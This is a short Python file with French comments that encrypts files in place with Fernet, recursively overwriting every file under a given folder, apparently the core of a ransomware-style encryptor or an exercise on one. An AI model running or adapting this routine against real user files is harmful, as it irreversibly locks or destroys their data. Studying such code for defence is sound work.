import pathlib
from cryptography.fernet import Fernet


def encrypt_file(filename, key):
    """Chiffre un fichier avec la clé donnée."""
    f = Fernet(key)
    # En mode binaire ("rb"), Python lit exactement les octets tels qu’ils sont dans le fichier, 
    # sans essayer de décoder ces octets en caractères texte (comme UTF-8, ASCII, etc.). 
    # Cela évite toute corruption des données
    with open(filename, "rb") as file:
        data = file.read()
    encrypted_data = f.encrypt(data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)
    print(f"[+] Fichier chiffré : {filename}")


def encrypt_folder(foldername, key):
    """Chiffre récursivement tous les fichiers d’un dossier."""
    for child in pathlib.Path(foldername).rglob("*"):
        if child.is_file():
            encrypt_file(str(child), key)
